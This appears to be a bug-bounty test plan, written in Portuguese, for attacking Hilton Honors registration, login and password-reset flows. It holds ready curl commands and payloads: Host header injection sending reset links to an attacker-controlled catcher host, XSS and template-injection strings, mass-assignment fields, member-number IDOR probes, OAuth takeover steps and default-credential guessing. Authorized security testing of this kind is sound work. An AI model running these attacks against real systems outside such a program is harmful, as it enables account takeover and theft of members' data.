# Hilton Honors Authentication — Attack Playbook

**Target:** `https://www.hilton.com/en/hilton-honors/join/`  
**Tier:** A ($1k–$10k)  
**Requer:** Conta com "Test-Hackerone" no nome

---

## Attack 1 — Account Pre-Hijacking

**Conceito:** Registrar email da vítima antes que ela o faça. Se a verificação de email não é obrigatória para acesso, ou se é bypassável, o atacante assume a conta quando a vítima tenta se cadastrar.

```
Step 1: Registrar conta com email_vítima@gmail.com
  (First: Test-Hackerone, Last: Test-Hackerone)
  UA: ... HackerOne

Step 2: Verificar: A conta é imediatamente acessível OU precisa verificar email?
  → Se acessível sem verificação: pré-hijack confirmado

Step 3: Tentar login com email_vítima@gmail.com antes de verificar
  → Se login funciona sem verificar email: CRITICAL

Step 4: Verificar se re-registro com mesmo email retorna erro
  → "Email already in use": confirma que pré-hijack bloqueia a vítima

Step 5: Verificar se o link de verificação que chega no email da vítima
  → Reset/verification URL tem token previsível?
  → O token pode ser intercalado com o da conta do atacante?

Impact se confirmado: CRITICAL — ATO em qualquer email de vítima
```

**O que observar no Burp:**
```http
POST /en/hilton-honors/join/ HTTP/2
Host: www.hilton.com
User-Agent: ... HackerOne
Content-Type: application/json

{"firstName":"Test-Hackerone","lastName":"Test-Hackerone",
 "email":"test_victim@example.com","password":"..."}

RESPONSE SUCCESS: Verificar statusCode e se retorna session/token imediatamente
```

---

## Attack 2 — Email Enumeration na Página de Cadastro

**Conceito:** Se a mensagem de erro diferencia "email não existe" de "email já cadastrado", permite enumerar contas.

```bash
# Teste 1: Email não existente
curl -si https://www.hilton.com/en/hilton-honors/join/ \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: HackerOne" \
  -d '{"email":"definitely_not_existing_xyz123@example.com"}'

# Teste 2: Email existente (use seu próprio email de teste)
curl -si https://www.hilton.com/en/hilton-honors/join/ \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: HackerOne" \
  -d '{"email":"YOUR_TEST_EMAIL@example.com"}'

# Comparar: diferentes status codes? Diferentes mensagens?
# "Email already in use" vs "Invalid email" → enumeração confirmada
```

---

## Attack 3 — Password Reset: Host Header Injection

```bash
# Captura request de password reset no Burp, modifica Host header
# (também testar X-Forwarded-Host, X-Host, Forwarded)
curl -si https://www.hilton.com/en/hilton-honors/forgot-password \
  -X POST \
  -H "Host: attacker.requestcatcher.com" \
  -H "User-Agent: ... HackerOne" \
  -H "Content-Type: application/json" \
  -d '{"email":"YOUR_TEST_EMAIL@example.com"}'

# Se reset link chegar em YOUR_TEST_EMAIL com "attacker.requestcatcher.com" no link
# → Host Header Injection confirmada → redirect_uri for password reset to attacker

# Variações do header:
# -H "X-Forwarded-Host: attacker.requestcatcher.com"
# -H "X-Forwarded-For: attacker.requestcatcher.com"
# -H "X-Original-URL: https://attacker.requestcatcher.com/reset"
```

---

## Attack 4 — Password Reset Token Analysis

```
Step 1: Solicitar password reset para SUA conta de teste
Step 2: Receber email — analisar o link
  https://www.hilton.com/en/hilton-honors/reset-password?token=XXXX&email=YOUR_EMAIL

Step 3: Checar token:
  - Token contém timestamp? (decode base64 e procurar por epoch)
  - Token é previsível? (solicitar 3 resets e comparar tokens)
  - Token expira? (tentar usar depois de 24h)
  - Token invalida após uso? (usar o mesmo link 2x)
  - Token é bound ao email? (mudar ?email= no link para outro email)

Step 4: Solicitar reset duas vezes
  - O token ANTERIOR ainda é válido após solicitar um NOVO?
  - Se sim: token reuse → HIGH

Step 5: Usar token → mudar senha → tentar usar o mesmo token de novo
  - Se ainda aceita: token não invalida após uso → HIGH/CRITICAL
```

---

## Attack 5 — OAuth/SSO Linking Flow

```
Hilton Honors provavelmente suporta: Google, Apple, Facebook OAuth
(verificar na página de cadastro/login)

Test Sequence:
1. Criar conta A com email_A@gmail.com + senha
2. Criar conta B com email_B@gmail.com + senha
3. Tentar vincular Google OAuth (email_A) à conta B
   → Se não verifica se email do Google é o mesmo da conta → ATO via OAuth merge

Variação — Account Takeover via OAuth:
1. Vítima tem conta Hilton Honors com email@company.com
2. Atacante: cria conta Hilton Honors, vincula Google OAuth (email@company.com)
3. Se Hilton permite vincular OAuth sem verificar ownership → email hijack

State Parameter CSRF:
- Interceptar GET /oauth/google/authorize
- Verificar se ?state= existe e é único
- Se state ausente ou fixo → CSRF na OAuth callback

Session Fixation via OAuth:
- Iniciar OAuth flow → capturar ?state= ou session cookie
- Enviar link de callback para vítima (domínio Hilton = confiável)
- Se vítima completa auth → atacante tem o token/session
```

---

## Attack 6 — Session Management

```bash
# Pós-login: inspecionar cookies
# Testar: HttpOnly, Secure, SameSite, Domain scope

# Cookie scope — se for .hilton.com, subdomain XSS → session theft
# Verificar: document.cookie na console do browser para cada subdomain em scope

# Concurrent sessions:
# Login em browser A → capturar session token
# Login em browser B (mesma conta) → verificar se token de A ainda é válido
# Se sim: sem limite de sessão concorrente (informational mas pode afetar ATO)

# Session rotation após login:
# 1. Antes de logar → anotar qualquer session cookie da hilton.com
# 2. Logar → verificar se session cookie MUDOU
# Se não mudou → session fixation potencial
```

---

## Attack 7 — Hilton Honors Number IDOR

```
Após criar conta, verificar qual é seu número Hilton Honors (formato: XXXXXXXXX)

Testar endpoints descobertos no JS:
GET /api/v1/member/{honorsNumber}/profile
GET /api/v1/member/{honorsNumber}/reservations
GET /api/v1/member/{honorsNumber}/points
GET /api/member/{honorsNumber}/preferences

Com número do ATACANTE (authorization check): verificar o que retorna
Com número do ATACANTE ± 1 (outro usuário): verificar o que retorna
  → Se retorna dados de outro membro → IDOR HIGH

Se endpoint usa UUID (Hilton pode usar), verificar se UUID exposta em algum lugar
(emails, URLs, etc.) e tentar reutilizar em outros endpoints
```

---

## Attack 8 — Mass Assignment no Registro/Atualização de Perfil

```bash
# Interceptar POST de registro/atualização de perfil
# Tentar adicionar campos extra no body:

{"firstName":"Test-Hackerone","lastName":"Test-Hackerone",
 "email":"test@example.com",
 "role":"admin",           # tentativa
 "tier":"diamond",         # tentar obter tier alto
 "points":1000000,         # tentar adicionar pontos
 "isEmployee":true,        # employee tier bypass
 "accountType":"corporate" # tentar acesso corporativo
}

# Também na atualização de perfil:
# PUT /api/member/ME → com campos extras
# Verificar o que é refletido na resposta e no perfil
```

---

## Attack 9 — XSS via Campos de Perfil (Stored ≠ POST-based)

```
"POST-based XSS" (OOS) = XSS refletido via POST

Stored XSS em campos de perfil = DIFERENTE = em scope

Campos para testar (com conta de teste):
- First Name: Test-Hackerone"><svg onload=alert(1)>
- Last Name: Test-Hackerone<img src=x onerror=alert(1)>
- Address fields
- Preferences/special requests

Onde verificar se renderiza:
1. Página "My Account" / profile page
2. Email de confirmação de reserva (XSS em email? Diferente)
3. PDF gerado (PDF XSS → potencial SSRF)
4. Admin panel se nome aparece em algum relatório
5. Receipt/invoice print view

SSTI simultâneo:
- First Name: Test-Hackerone {{7*7}}
- First Name: Test-Hackerone ${7*7}
- First Name: Test-Hackerone #{''.class.mro[1].subclasses()}
```

---

## Attack 10 — suppliersconnection.hilton.com

```bash
# Fingerprint do app
curl -si "https://suppliersconnection.hilton.com" \
  -H "User-Agent: HackerOne"
# Verificar: server header, powered-by, X-Powered-By, Set-Cookie format

# Login page analysis
curl -si "https://suppliersconnection.hilton.com/login" \
  -H "User-Agent: HackerOne"

# XSS em campos de login (fora de sessão)
# (CSRF excluído mas XSS não)
# Buscar: parâmetros GET que se refletem na página

# Se tem autenticação própria (não SSO com Hilton Honors):
# → Tentar default credentials de fornecedores (admin/admin, supplier/supplier)
# → Tentar password reset com Host header injection
# → Tentar enumeration via mensagens de erro
```

---

## Prioridade de Execução

```
DIA 1 — RUSH (apps novos = janela de oportunidade)
  1. Download + decompile Android APK
  2. Buscar API keys, endpoints, Hilton Honors API base URL em APK
  3. Passive recon (subfinder + crt.sh)

DIA 2 — Auth attacks
  1. Criar conta Hilton Honors (Test-Hackerone)
  2. Mapear registration/login API no Burp
  3. Testar Account Pre-Hijacking (Attack 1)
  4. Testar Password Reset chain (Attacks 3 + 4)
  5. Testar email enumeration (Attack 2)

DIA 3 — IDOR + OAuth
  1. Mapear endpoints de membro após login
  2. Testar Hilton Honors Number IDOR
  3. Testar OAuth/SSO linking
  4. suppliersconnection.hilton.com fingerprint + XSS

DIA 4 — JS analysis + subdomains
  1. Analisar JS bundles para endpoints/secrets
  2. Revisar subdomains ativos para admin panels/staging
  3. Verificar CIDR 167.187.0.0/16 para apps expostos
```
